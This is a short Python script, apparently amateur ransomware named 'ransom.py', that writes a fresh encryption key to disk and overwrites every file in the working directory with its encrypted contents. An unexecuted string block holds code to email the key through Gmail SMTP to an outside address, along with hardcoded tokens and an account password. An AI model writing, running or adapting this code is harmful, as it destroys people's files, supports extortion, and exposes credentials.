import os
from cryptography.fernet import Fernet
#from smtplib import SMTP,ssl
import oauth2 as oauth
import oauth2.clients.smtp as smtplib
import ssl

key= Fernet.generate_key()
with open("thekey.key","wb") as thekey:
    thekey.write(key)
hg= ''' files=[]

key= Fernet.generate_key()
with open("thekey.key","wb") as thekey:
    thekey.write(key)
context = ssl.create_default_context()
consumer = oauth.Consumer('anonymous', 'anonymous')
token = oauth.Token('1/MI6B2DqJP4FEkDRLUKrD5l46sQ0758-2ucEKBY-DeB0', 'NysqNqVTulFsdHpSRrPP56sF')
server=smtplib.SMTP("smtp.gmail.com",587)
server.ehlo()
server.starttls(context=context)
server.authenticate("gediongeorge123gmail.com","ILH!@#123.ORG",token)
server.sendmail("mrcrackerbam@gmail.com",key)
'''

files=[]

for file in os.listdir():
    if file == "ransom.py":
        continue
    if file == "thekey.key":
        continue
    if file == "decrypter.py":
        continue
    files.append(file)


for file in files:
    with open(file,"rb") as thefile:
        thefiler=thefile.read()
        encrypter=Fernet(key)
        encrypted_msg=encrypter.encrypt(thefiler)
    with open(file,"wb") as thefile1:
        thefile1r=thefile1.write(encrypted_msg)
        
    
    #with open(file,"wb") as thefile2:
        
        
        
print (files)

